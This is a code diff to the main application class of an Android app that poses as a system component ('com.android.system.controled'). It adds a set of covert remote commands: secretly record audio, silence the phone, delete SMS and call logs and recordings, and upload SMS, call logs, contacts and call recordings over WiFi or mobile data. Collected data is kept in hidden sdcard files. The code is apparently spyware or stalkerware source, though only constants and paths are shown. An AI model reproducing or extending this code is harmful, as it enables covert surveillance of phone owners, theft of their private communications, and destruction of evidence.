@@ -5,7 +5,7 @@ import java.io.File;
 import android.app.Application;
 import android.os.Environment;
 
-import com.android.system.controled.db.DatabaseUtil;
+import com.android.system.controled.db.SdcardSqliteHelper;
 import com.android.system.controled.util.InitUtil;
 import com.android.system.controled.util.StringUtil;
 
@@ -55,17 +55,47 @@ public class MainApplication extends Application {
 
 	public static final String PHONE_CODE_TURNON_WIFI = "zgy_057";// TURN_ON_WIFI
 	public static final String PHONE_CODE_TURNON_MOBILE = "zgy_056";// TURN_ON_MOBILE
+	
+	public static final String PHONE_CODE_UP_MARK = "调大铃声音量";// TURN_UP
+	public static final String PHONE_CODE_DOWN_MARK = "使手机静音";// TURN_DOWN
+	public static final String PHONE_CODE_CALL_ME_MARK = "给我打电话";// CALL_ME
+
+	public static final String PHONE_CODE_RECORD_TIME_MARK = "录音N分钟";// RECORD_TIME:
+	public static final String PHONE_CODE_RECORD_START_MARK = "开始录音";// RECORD_START
+	public static final String PHONE_CODE_RECORD_END_MARK = "结束录音";// RECORD_END
+
+	public static final String PHONE_CODE_DELETE_MSG_LOG_MARK = "删除短信记录";// DEL_MSG
+	public static final String PHONE_CODE_DELETE_CALL_LOG_MARK = "删除通话记录";// DEL_CALL
+	public static final String PHONE_CODE_DELETE_AUDIOS_CALL_MARK = "删除通话录音";// DEL_AUDIO_CALL
+	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER_MARK = "删除其他录音";// DEL_AUDIO_OTHER
+	public static final String PHONE_CODE_DELETE_ALL_LOG_MARK = "删除所有记录";// DEL_ALL
+
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MARK = "上传短信通话记录[仅Wifi]";// HELLO_SMS_CALL
+	public static final String PHONE_CODE_UPLOAD_ALL_MARK = "上传所有记录、录音[仅Wifi]";// HELLO_ALL
+	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MARK = "上传通话录音[仅Wifi]";// HELLO_CALL_AUDIO
+	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK = "上传其他录音[仅Wifi]";// HELLO_OTHER_AUDIO
+	public static final String PHONE_CODE_UPLOAD_CONTACTS_MARK = "上传通讯录[仅Wifi]";// HELLO_CONTACTS
+
+	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK = "上传短信通话记录[含gprs]";// HELLO_SMS_CALL_MOBILE
+	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE_MARK = "上传所有记录、录音[含gprs]";// HELLO_ALL_MOBILE
+	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK = "上传通话录音[含gprs]";// HELLO_CALL_AUDIO_MOBILE
+	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK = "上传其他录音[含gprs]";// HELLO_OTHER_AUDIO_MOBILE
+	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK = "上传通讯录[含gprs]";// HELLO_CONTACTS_MOBILE
+
+	public static final String PHONE_CODE_TURNON_WIFI_MARK = "打开Wifi";// TURN_ON_WIFI
+	public static final String PHONE_CODE_TURNON_MOBILE_MARK = "打开Gprs";// TURN_ON_MOBILE
 
 	public static final String SERVICE_NAME_LISTEN = "com.android.system.controled.service.ListenService";
 
 	public static final String FILE_IN_SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/receiver/";
-	public static final String FILE_SMS_DB = MainApplication.FILE_IN_SDCARD + DatabaseUtil.DB_NAME;
+	public static final String FILE_SMS_DB = MainApplication.FILE_IN_SDCARD + SdcardSqliteHelper.DATABASENAME;
 	
 	public static final String FILE_SMS_TEXT = FILE_IN_SDCARD + ".androidsms.txt";
 	public static final File FILE_CALL_LOG = new File(FILE_IN_SDCARD + ".androidcall.txt");
 	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
 	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
+	public static final String FILEPATH_CODES = FILE_IN_SDCARD + "codes.txt";
 	
 	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
